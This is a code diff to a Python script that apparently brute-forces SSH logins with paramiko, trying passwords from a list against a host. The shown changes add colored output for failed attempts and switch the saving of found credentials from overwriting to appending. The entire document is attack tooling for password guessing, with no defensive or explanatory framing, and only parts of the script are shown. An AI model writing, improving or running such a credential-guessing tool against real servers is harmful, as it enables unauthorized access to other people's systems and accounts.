@@ -11,6 +11,7 @@ BLUE = Fore.BLUE
 RESET = Fore.RESET
 RED = Fore.RED
 GREEN = Fore.GREEN
+YELLOW = Fore.YELLOW
 
 
 def is_ssh_open(hostname, username, password):
@@ -23,7 +24,7 @@ def is_ssh_open(hostname, username, password):
         print(f"{RED}[!] Host {hostname} unreachable.{RESET}")
         return False
     except paramiko.AuthenticationException:
-        print(f"[!] Credentials are invalid {username} : {password}")
+        print(f"{YELLOW}[!] Credentials are invalid {username} : {password}{RESET}")
         return False
     except paramiko.SSHException:
         print(f"{BLUE}[*] Quota exceeded, retrying with delay... {RESET}")
@@ -55,4 +56,4 @@ if __name__ == "__main__":
     for password in passList:
         if is_ssh_open(host, user, password):
             # If valid save to file
-            open("credentials.txt", "w").write(f"{user}@{host}:{password}")
+            open("credentials.txt", "a").write(f"{user}@{host}:{password}\n")
